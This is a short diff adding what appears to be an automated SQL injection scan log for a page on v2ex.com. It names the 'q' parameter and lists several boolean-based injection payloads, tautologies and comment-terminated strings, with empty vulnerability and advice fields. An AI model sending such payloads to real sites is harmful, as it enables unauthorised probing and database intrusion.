@@ -1,0 +1,13 @@
+Target: http://www.v2ex.com/t/167156 (GET)
+
+---
+URL:http://www.v2ex.com/t/167156 (GET)
+VulnName: 
+Query: {'q': 'cntvalue'}
+Payload: '	and	'6025'='6025
+'	and	'23185'='23185
+'	or	83668=83668#
+'	and	'56481'='56482
+Advice: 
+Database: unknown
+---
